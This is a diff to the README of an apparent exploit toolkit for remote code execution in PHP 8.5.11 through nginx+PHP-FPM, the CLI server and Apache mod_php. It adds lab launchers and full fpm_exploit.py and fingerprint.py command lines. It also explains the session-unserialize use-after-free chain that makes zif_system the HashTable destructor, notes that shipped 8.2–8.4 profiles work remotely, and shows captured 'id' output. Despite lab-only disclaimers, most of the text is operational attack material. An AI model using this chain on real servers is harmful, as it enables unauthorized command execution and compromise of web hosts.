@@ -2,7 +2,7 @@
 
 Built by DeepSeek V4 Flash.
 
-This is a lab-only setup for educational research against PHP 8.5.11 mod_php. The vulnerable module and configuration are intentionally unsafe.
+This is a lab-only setup for educational research against vulnerable PHP 8.5.11 deployments: Apache mod_php, nginx + PHP-FPM and the PHP built-in CLI server. The lab configurations are intentionally unsafe.
 
 Do not run this against systems you do not own or have explicit authorization to test. Keep the lab isolated and do not expose it to an untrusted network.
 
@@ -13,6 +13,8 @@ Do not run this against systems you do not own or have explicit authorization to
 - `bash lab/start-apache-default.sh` — filter-enabled default-ish limits, port 18090.
 - `bash lab/start-apache-session.sh` — session upload-progress target, 8M, port 18091.
 - `sudo bash lab/start-php8511-docker.sh` — official PHP 8.5.11 Debian Docker target, port 18093; `--down` removes it.
+- `bash lab/start-nginx-fpm.sh` — nginx + PHP-FPM 8.5.11, chain port 8556 and builder port 8557; `--down` stops it.
+- `bash lab/start-php-cli.sh` — PHP 8.5.11 built-in server, chain port 18098 and builder port 18099; `--down` stops it.
 
 Filter-enabled `$_FILES` bypass:
 
@@ -56,6 +58,32 @@ profile; `--list-profiles` prints the catalog. HTTP does not expose CPU
 architecture, so exact auto-dispatch requires `--arch` when both architecture
 profiles exist.
 
+For nginx + PHP-FPM or the PHP built-in server, `fingerprint.py` selects the
+persistent-SAPI chain instead of the Apache mod_php chain:
+
+```bash
+# nginx + PHP-FPM lab; local maps supply ASLR bases
+python3 fingerprint.py -u http://127.0.0.1:8556/index.php \
+    --builder-url http://127.0.0.1:8557 \
+    --persistent --local-bases --run
+
+# PHP CLI built-in server lab; --pid is the supervised chain worker
+python3 fingerprint.py -u http://127.0.0.1:18098/index.php \
+    --builder-url http://127.0.0.1:18099 \
+    --persistent --local-bases \
+    --pid "$(cat lab/fpm/runtime/php-8.5.11/cli/chain.pid)" --run
+```
+
+The persistent chain needs a **builder endpoint** with `memory_limit=64M` and
+`session.upload_progress.cleanup=Off`; that endpoint creates the large session
+file. The chain endpoint runs at 8M with cleanup On. The target application
+must call `session_start()` and reflect session values; `lab/fpm/webroot/app.php`
+is the lab example. `--local-bases` is only for a disposable local lab; remote
+runs use the HTTP stale-string leak from the shipped 8.2/8.3/8.4 profiles. The
+8.5.11 profiles in this repo have calibrated reclaim geometry but not a
+calibrated HTTP leak, so remote 8.5.11 runs still need `--chunk/--pie` or a
+new calibration.
+
 When the PHP version or architecture is unknown, use the priority fallback:
 
 ```bash
@@ -84,10 +112,12 @@ entries for 8.3, 8.2, 8.1, 8.0 and 7.4. Only a profile with `rce: true` and all
 stage parameters can be auto-run. See `profiles/README.md` for sources and the
 exact status table.
 
-The exploit target must be Apache prefork `mod_php` with one worker. This port
-does not pin multiple prefork children; a known multi-worker target is marked
-incompatible. The OOM probe and the chain are disruptive; use them only on an
-authorized, disposable lab.
+The Apache session-chain target must be prefork `mod_php` with one worker. This
+port does not pin multiple prefork children; a known multi-worker target is
+marked incompatible. The persistent chain instead supports nginx + PHP-FPM and
+the PHP built-in CLI server through the separate `fpm_exploit.py` primitive.
+The OOM probe and both chains are disruptive; use them only on an authorized,
+disposable lab.
 
 ## Session chain
 
@@ -126,3 +156,71 @@ python3 calibrate_session.py -u http://127.0.0.1:18091/index.php \
 ```
 
 On this minimal build it currently stops at stage 1: the `N=900`/forge-48 probe returns a normal 32-byte cookie with no `vNNNN` stale-block index. A profile for this exact binary is still required; the official 8.5.11 profile values do not transfer to it.
+
+## Persistent-SAPI chain (nginx + PHP-FPM / PHP CLI server)
+
+`fpm_exploit.py` implements the second, FPM-validated primitive:
+post-RINIT OOM in `session_start()` leaves `BG(unserialize)` dangling; a later
+multipart request starts session decoding in the pre-RINIT `rfc1867` handler
+and reclaims the freed `php_unserialize_data` with a forged var_hash. The
+forged session reference destroys a fake `HashTable` whose `pDestructor` is
+`zif_system`. This is not the Apache pre-RINIT chain: FPM exits a child when
+request startup fails, so it uses an application-level producer instead.
+
+The lab webroot is `lab/fpm/webroot`; the application pages are:
+
+- `app.php` — calls `session_start()` and reflects session values.
+- `bigvar.php` — builds the large session that triggers the producer OOM.
+- `ref.php` — stores a reference so the consumer can decode `R:2`.
+- `index.php` — health check and SAPI/version hint.
+
+The persistent launchers use `PHP_FPM`/`PHP_CLI`/`NGINX_BIN` if set; otherwise they use a system binary or fall back to `nix build nixpkgs#php85` and `nixpkgs#nginx`. Start either persistent lab:
+
+```bash
+bash lab/start-nginx-fpm.sh
+# chain:   http://127.0.0.1:8556/app.php
+# builder: http://127.0.0.1:8557/app.php
+
+bash lab/start-php-cli.sh
+# chain:   http://127.0.0.1:18098/app.php (supervised)
+# builder: http://127.0.0.1:18099/app.php
+```
+
+Run the chain directly:
+
+```bash
+# FPM
+python3 fpm_exploit.py \
+    --base http://127.0.0.1:8556 --builder http://127.0.0.1:8557 \
+    --version 8.5.11 --profile profiles/fpm/8.5.11-fpm.json \
+    --command 'id>out/p1' --proof-file out/p1 \
+    no-oracle --local-bases
+
+# CLI built-in server (the supervisor restarts the aborted worker)
+python3 fpm_exploit.py \
+    --base http://127.0.0.1:18098 --builder http://127.0.0.1:18099 \
+    --version 8.5.11 --profile profiles/fpm/php-8.5.11-cli.json \
+    --pid "$(cat lab/fpm/runtime/php-8.5.11/cli/chain.pid)" \
+    --command 'id>out/cli-p1' --proof-file out/cli-p1 \
+    no-oracle --local-bases
+```
+
+Verified in this workspace:
+
+```text
+nginx+FPM:  uid=1000(fipso) gid=100(users) groups=...
+CLI server: uid=1000(fipso) gid=100(users) groups=...
+```
+
+The 8.5.11 FPM and CLI profiles have calibrated reclaim geometry, but their
+HTTP stale-string leak geometry is not calibrated; remote use therefore needs
+`--chunk/--pie` or a profile calibrated with `fpm_exploit.py ... calibrate`.
+The shipped 8.2/8.3/8.4 FPM profiles have HTTP-leak calibration and can be used
+without local `/proc` access when the exact build matches.
+
+`fpm_exploit.py`, `fpm_labs.py`, the FPM lab templates and the 8.2-8.4 profiles
+are derived from `devploit/php2shell` (MIT); see `profiles/fpm/README.md` and the
+upstream repository. They are intentionally separate from the Apache mod_php
+session chain. Worker pinning is not implemented for a multi-worker FPM pool;
+the labs pin one chain worker. Use only on systems you own or are explicitly
+authorized to test.
